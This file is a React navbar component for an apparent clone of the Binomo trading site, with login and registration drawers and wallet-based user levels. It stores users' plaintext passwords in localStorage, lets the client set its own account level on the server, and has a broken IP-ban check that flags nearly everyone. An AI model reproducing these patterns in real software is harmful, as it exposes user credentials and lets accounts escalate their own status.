import React, { useState } from "react";
import { HiMenuAlt1 } from "react-icons/hi";
import { IoEnterOutline } from "react-icons/io5";
import { IoClose } from "react-icons/io5";
import { FaInstagram } from "react-icons/fa";
import { FaTelegramPlane } from "react-icons/fa";
import { IoIosArrowDown } from "react-icons/io";
import { IoIosArrowUp } from "react-icons/io";
import { FaEuroSign } from "react-icons/fa";
import { FaDollarSign } from "react-icons/fa";
import "./nav.scss";
import { Link, useNavigate } from "react-router-dom";
import Drawer from "react-modern-drawer";
import "react-modern-drawer/dist/index.css";
import toast, { Toaster } from "react-hot-toast";
import { RxAvatar } from "react-icons/rx";
import { jwtDecode } from "jwt-decode";
import { useEffect } from "react";
import axios from "axios";

const notify = () => toast("This function haven't been working yet");

const Nav = () => {
  const [pass, setPass] = useState(false);
  const [pass2, setPass2] = useState(false);
  const [passReg, setPassReg] = useState(false);
  const [typeWallet, setTypeWallet] = useState("euro");
  const [isReg, setIsReg] = useState(false);
  const [isOpen, setIsOpen] = useState(false);
  const [isOpenReg, setIsOpenReg] = useState(false);
  const API = "https://binomo-backend.onrender.com";
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [name, setName] = useState("");
  const [password, setPassword] = useState("");
  const [user, setUser] = useState([]);
  const [patchedLevel, setPatchedLevel] = useState(false); // State to track if user level has been patched
  const decoded = localStorage.getItem("Access") ? jwtDecode(localStorage.getItem("Access")) : {};
  const [ipadress, setipadress] = useState('');

  const getUser = async () => {
    try {
      const res = await axios.get(`https://binomo-backend.onrender.com/users/${decoded.user._id}`);
      setUser(res.data);
    } catch (err) {
      console.log(err);
    }
  };
  const fetchIp = async () => {
    try {
      const res = await axios.get(`http://api.ipify.org`);
      setipadress(res.data);
    } catch (err) {
      console.log(err);
    }
  };
  const regEnter = async (e) => {
    e.preventDefault();
    await axios
      .post(`${API}users/login`, {
        email: email,
        name: name,
        password: password,
      })
      .then((res) => {
        if (res.status === 201) {
          navigate("/login");
        } else {
          console.log(res.data.message);
        }
      })
      .catch((err) => {
        alert(err.response.data.message);
      });
  };
  const RegistratinInfo = () => {
    localStorage.setItem("email", email);
    localStorage.setItem("name", name);
    localStorage.setItem("password", password);
  };


  const dropDownToggle = () => {
    if (!pass) {
      setPass(true);
    } else {
      setPass(false);
    }
  };
  const dropDownToggle2 = () => {
    if (!pass2) {
      setPass2(true);
    } else {
      setPass2(false);
    }
  };
  const toggleDrawer = () => {
    setIsOpen((prevState) => !prevState);
  };
  const toggleDrawerReg = () => {
    setIsOpenReg((prevState) => !prevState);
  };

  useEffect(() => {
    if (!patchedLevel && user !== null) {
      if (Math.round(Number(user.wallet)) >= 0 && Math.round(Number(user.wallet)) <= 50000) {
        const handleL = async () => {
          try {
            await axios.patch(`https://binomo-backend.onrender.com/users/${decoded?.user?._id}`, {
              level: 1 // Increment level count
            });
          } catch (error) {
            console.log(error);
          }
        }
        handleL()
        setPatchedLevel(true); // Set patchedLevel to true to indicate the user level has been patched
      }else if(Math.round(Number(user.wallet)) >= 50000 && Math.round(Number(user.wallet)) <= 100000){
        const handleL = async () => {
          try {
            await axios.patch(`https://binomo-backend.onrender.com/users/${decoded?.user?._id}`, {
              level: 2 // Increment level count
            });
          } catch (error) {
            console.log(error);
          }
        }
        handleL()
        setPatchedLevel(true);
      }else if(Math.round(Number(user.wallet)) >= 100000 && Math.round(Number(user.wallet)) <= 500000){
        const handleL = async () => {
          try {
            await axios.patch(`https://binomo-backend.onrender.com/users/${decoded?.user?._id}`, {
              level: 3 // Increment level count
            });
          } catch (error) {
            console.log(error);
          }
        }
        handleL()
        setPatchedLevel(true);
      }else if(Math.round(Number(user.wallet)) >= 500000 && Math.round(Number(user.wallet)) <= 1000000){
        const handleL = async () => {
          try {
            await axios.patch(`https://binomo-backend.onrender.com/users/${decoded?.user?._id}`, {
              level: 4 // Increment level count
            });
          } catch (error) {
            console.log(error);
          }
        }
        handleL()
        setPatchedLevel(true);
      }else if(Math.round(Number(user.wallet)) >= 1000000000){
        const handleL = async () => {
          try {
            await axios.patch(`https://binomo-backend.onrender.com/users/${decoded?.user?._id}`, {
              level: 5 // Increment level count
            });
          } catch (error) {
            console.log(error);
          }
        }
        handleL()
        setPatchedLevel(true);
      }
    }
  }, [user, patchedLevel]);

  useEffect(() => {
    if (user !== null) {
      if (user?.useractived === false) {
        navigate("/ban");
      } else if (ipadress[0] === "9" || ipadress !== '') {
        navigate("/api-baned");
      }
    }
    
  }, [user, ipadress, navigate]);

  useEffect(() => {
    fetchIp()
    getUser()
  }, [])
  return (
    <>
      <nav>
        <Toaster
          toastOptions={{
            className: "r-toast",
          }}
        />
        <div className="case">
          <div className="navbar">
            <div className="n-left">
              {!isOpen ? (
                <HiMenuAlt1 onClick={toggleDrawer} className="burger" />
              ) : (
                <IoClose className="exit" onClick={() => setIsOpen(false)} />
              )}
              <Drawer
                open={isOpen}
                direction="left"
                className="n-menu"
                onClose={toggleDrawer}
                overlayColor="no"
                size={'30%'}
              >
                <div className="n-line">
                  <h1>VIP</h1>
                </div>
                <div className="n-line">
                  <div className="active-top" onClick={dropDownToggle}>
                    <h1>For traders</h1>
                    {!pass ? <IoIosArrowDown /> : <IoIosArrowUp />}
                  </div>
                  <div className={pass ? "active" : "default"}>
                    <h1>Tournaments</h1>
                    <h1>Promotions</h1>
                    <h1>Strategies</h1>
                  </div>
                </div>
                <div className="n-line">
                  <div className="active-top" onClick={dropDownToggle2}>
                    <h1>Information</h1>
                    {!pass2 ? <IoIosArrowDown /> : <IoIosArrowUp />}
                  </div>
                  <div className={pass2 ? "active" : "default"}>
                    <h1>Statuses</h1>
                    <h1>About US</h1>
                    <h1>Regulations</h1>
                    <h1>Client Agreement</h1>
                    <h1>AML policy</h1>
                  </div>
                </div>
                <div className="n-line">
                  <h1>Help Center</h1>
                </div>
                <div className="n-line">
                  <h1>Binomo Blog</h1>
                </div>
                <a href="https://t.me/binomoplatform">
                  <button className="b-telegram">
                    Binomo on Telegram <FaTelegramPlane className="n-icon" />
                  </button>
                </a>
                <a href="https://www.instagram.com/binomo/">
                  <button className="b-instagram">
                    Binomo on Instagram <FaInstagram className="n-icon" />
                  </button>
                </a>
              </Drawer>
              {localStorage.getItem("Access") ? (
                <Link to={"/"} className="b-logo">
                  <img src="https://play-lh.googleusercontent.com/_XUdhIjKwhAv1F7n2SBDvSHcEfT3Rh4wpHquYYMi_uuJu-tn7B4yV7uuh0tdBrP3dC5Y" alt=""/>
                  <h1 className="bi-logo">binomo</h1>
                </Link>
              ) : (
                <Link to={"/"} className="b-logo">
                  <img src="https://play-lh.googleusercontent.com/_XUdhIjKwhAv1F7n2SBDvSHcEfT3Rh4wpHquYYMi_uuJu-tn7B4yV7uuh0tdBrP3dC5Y" alt=""/>
                  <h1 className="bi-logo">binomo</h1>
                </Link>
              )}
            </div>
            <div className="n-right">
              {!localStorage.getItem("Access") ? (
                <Link to="/login">
                  <div className="logs">
                    {!isOpenReg ? (
                      <button>
                        <IoEnterOutline className="enter" />
                        <h1> Sign up</h1>
                      </button>
                    ) : (
                      <IoClose
                        className="exit"
                        onClick={() => setIsOpen(false)}
                      />
                    )}
                  </div>
                </Link>
              ) : (
                <div className="twice">
                  <Link to={"/profile"}>
                    {user?.image === undefined ? (
                      <RxAvatar className="a-twice"/>
                    ) : (
                      <img src={user?.image} className="a-twice a-img" alt="" />
                    )}
                  </Link>
                  <div className="w-line">
                    <b>{Math.round(user.wallet)}$</b>
                  </div>
                </div>
              )}
              <Drawer
                open={isOpenReg}
                onClose={toggleDrawerReg}
                direction="right"
                className="r-drawer"
                size={"40%"}
                overlayColor="no"
              >
                <div className="r-cat">
                  <div
                    className={!passReg ? "c-act" : "c-def"}
                    onClick={() => setPassReg(false)}
                  >
                    <h1>Registration</h1>
                  </div>
                  <div
                    className={passReg ? "c-act" : "c-def"}
                    onClick={() => setPassReg(true)}
                  >
                    <h1>Login</h1>
                  </div>
                </div>
                {passReg ? (
                  <div className="c-reg">
                    <div className="r-app">
                      <button className="r-facebook" onClick={notify}>
                        <img
                          src="https://binomo.com/h-assets/assets/shared-auth/icons/social-auth/facebook.svg"
                          alt=""
                        />
                      </button>
                      <sub>Soon</sub>
                      <button className="r-google">
                        <img
                          src="https://binomo.com/h-assets/assets/shared-auth/icons/social-auth/gp.svg"
                          alt=""
                        />
                      </button>
                    </div>
                    <form>
                      <input type="email" placeholder="Email" required />
                      <input type="password" placeholder="Password" required />
                      <div className="i-con"></div>
                      <a className="p-forgot" onClick={notify}>
                        Forgot my password
                      </a>
                      <button className="a-create">Sign in</button>
                    </form>
                    <div className="a-have">
                      <b>No account?</b>
                      <button onClick={() => setPassReg(false)}>Create</button>
                    </div>
                  </div>
                ) : (
                  <div className="c-reg">
                    <div className="r-app">
                      <button className="r-facebook" onClick={notify}>
                        <img
                          src="https://binomo.com/h-assets/assets/shared-auth/icons/social-auth/facebook.svg"
                          alt=""
                        />
                      </button>
                      <sub>Soon</sub>
                      <button className="r-google">
                        <img
                          src="https://binomo.com/h-assets/assets/shared-auth/icons/social-auth/gp.svg"
                          alt=""
                        />
                      </button>
                    </div>
                    <form onSubmit={regEnter}>
                      <input
                        value={email}
                        type="email"
                        placeholder="Email"
                        onChange={(e) => setEmail(e.target.value)}
                        required
                      />
                      <input
                        type="text"
                        placeholder="Name"
                        value={name}
                        onChange={(e) => setName(e.target.value)}
                        required
                      />
                      <input
                        type="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Password"
                        required
                      />
                      <div className="i-con">
                        <b>
                          8-64 characters. Latin letters, numbers or <br />{" "}
                          special symbols. Ensure you don’t use this <br />{" "}
                          password anywhere else
                        </b>
                      </div>
                      <div className="r-wallet">
                        <button
                          className={typeWallet === "euro" ? "w-act" : "w-def"}
                          onClick={() => setTypeWallet("euro")}
                        >
                          <FaEuroSign />
                        </button>
                        <button
                          className={typeWallet === "uzs" ? "w-act" : "w-def"}
                          onClick={() => setTypeWallet("uzs")}
                        >
                          UZS
                        </button>
                        <button
                          className={
                            typeWallet === "dollar" ? "w-act" : "w-def"
                          }
                          onClick={() => setTypeWallet("dollar")}
                        >
                          <FaDollarSign />
                        </button>
                      </div>
                      <div className="c-accept">
                        <input type="checkbox" className="checkbox-accept" />
                        <b>
                          I accept the terms of the{" "}
                          <a href="https://binomo.com/information/agreement">
                            Client Agreement
                          </a>{" "}
                          and{" "}
                          <a href="https://binomo.com/information/privacy">
                            Privacy Policy
                          </a>{" "}
                          and confirm being adult
                        </b>
                      </div>
                      <button
                        className="a-create"
                        type="submit"
                        onClick={() => RegistratinInfo()}
                      >
                        Create account
                      </button>
                    </form>
                    <div className="a-have">
                      <b>Have an account?</b>
                      <button onClick={() => setPassReg(true)}>Sign in</button>
                    </div>
                  </div>
                )}
              </Drawer>
              <img
                src="https://binomo.com/h-assets/shared/assets/images/home/icons/locale/en-a7df840a6ce6f251a574.svg"
                alt=""
                className="e-img"
              />
            </div>
          </div>
        </div>
      </nav>
    </>
  );
};

export default Nav;
